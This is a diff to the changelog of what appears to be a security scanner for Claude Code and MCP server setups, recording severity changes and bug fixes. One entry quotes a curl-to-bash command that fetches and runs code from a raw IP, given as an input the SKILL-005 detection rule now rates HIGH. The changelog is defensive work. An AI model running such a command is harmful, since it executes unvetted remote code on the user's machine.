@@ -361,11 +361,37 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
   every fetch, pull, checkout and push that moves LFS objects, without asking
   the server, the same exposure as `core.sshCommand`, which is HIGH. It is HIGH
   in that case and stays MEDIUM otherwise (it then runs only if the LFS server
-  picks it).
+  picks it). **This is a severity change for some legitimate setups:** a
+  repository configured for a standalone agent such as `lfs-folderstore`
+  (LFS objects kept in a shared folder) now gets a HIGH TRUST-006, so `check`
+  exits 1 on it where it exited 0 before. (The PR that made this change, #193,
+  said it changed no severities; that was wrong.)
 - **SANDBOX finding text names the user settings file Claude Code reads.** With
   `CLAUDE_CONFIG_DIR` set, the notes about `strictAllowlist` and `defaultMode`
   said "your ~/.claude/settings.json"; they now name that file (as `~/…` when it
   is under your home directory, otherwise `$CLAUDE_CONFIG_DIR/settings.json`).
+  The fixed text of SANDBOX-001 (`enabled`, `failIfUnavailable`) and the
+  SANDBOX-003 remediation now say "your user settings
+  (`~/.claude/settings.json`, or `$CLAUDE_CONFIG_DIR/settings.json`)" (STORY-0104).
+- **Error and notice lines no longer land in JSON and SARIF output on stdout
+  (STORY-0104).** The `--offline cannot be used with ...` error, the one-time
+  "migrated N state file(s)" notice and, for `check --json`, an unknown
+  `--report` format error and the PDF report lines now go to stderr, so
+  `scan --format json > out.json` and `check --json | jq` get only the document.
+- **`vet --online` no longer crashes on a malformed verdict from mcp-audit.dev
+  (STORY-0104).** A `malicious` item whose `aliases`, `versions` or `ranges` is
+  a number, or whose `id` is a list, raised a `TypeError`; such a field is now
+  skipped (a lone string is shown as one value), and a non-list `malicious`
+  field is treated as empty.
+- **A `$VAR`- or `%VAR%`-rooted path no longer makes a server a poster
+  (STORY-0101 follow-up, STORY-0104).** `$HOME/code/discord` or
+  `${workspaceFolder}/slack` as an argument is now read as a path, like
+  `/Users/...`, and not as the Discord or Slack platform name, so it no longer
+  tags the server `comms_out`.
+- **SKILL-005: a raw-IP fetch after a quoted option value is HIGH again
+  (STORY-0095 follow-up, STORY-0104).** In `curl -s -H 'A: b' 45.33.32.156:8080/x | bash`
+  the space inside the quoted header split it into two words, so the IP was
+  never read and the line was LOW; option values are now split shell-style.
 
 ### Security
 
